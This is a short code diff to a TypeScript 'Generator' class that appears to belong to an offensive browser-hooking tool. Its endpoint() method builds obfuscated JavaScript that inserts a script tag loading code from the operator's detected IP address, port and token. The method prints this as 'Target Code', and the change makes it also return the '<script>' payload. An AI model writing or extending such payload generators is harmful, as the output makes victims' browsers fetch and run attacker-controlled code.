@@ -36,7 +36,7 @@ export class Generator {
       }
     }
   }
-  public endpoint(): void{
+  public endpoint(): any{
     var b = jsObf.obfuscate(`
       var g = document.createElement('script');
       g.src = location.protocol + '//`+this.detectedIp+`:`+this.conf.port+`/`+this.takensalt+`'`+`
@@ -56,6 +56,7 @@ export class Generator {
       console.log('[!]',this.loader.colorStr(this.loader.color.Green,"===========Target=Code============="));
       console.log('<script>'+b+'</script>');
       console.log('[!]',this.loader.colorStr(this.loader.color.Green,"==================================="));
+      return "<script>"+b+"</script>"
   }
   public init(): any {
     var a = jsObf.obfuscate(`
